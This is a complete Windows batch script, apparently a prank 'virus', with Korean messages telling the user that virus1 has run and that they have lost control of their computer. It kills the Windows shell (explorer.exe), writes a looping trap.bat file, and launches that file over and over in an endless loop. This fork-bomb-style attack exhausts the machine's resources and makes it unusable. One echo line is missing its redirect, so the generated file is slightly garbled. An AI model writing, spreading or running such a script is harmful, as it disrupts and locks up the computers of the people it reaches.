@echo off
taskkill -f -im explorer.exe
cls
echo virus1이 실행되었습니다.
timeout 3 >> null
echo 더 이상 컴퓨터의 제어권을 사용자님 한테 없습니다.
timeout 2 >> null
cls
color 4
echo computer down
timeout 2 >> null
taskkill -f -im explorer.exe
echo @echo off >> trap.bat
echo color 4 >> trap.bat
echo :a >> trap.bat
echo echo down down down down down down down down down down down down down down down down down down down
echo goto a >> trap.bat
:a
start trap.bat
timeout 0.5 >> null
goto a
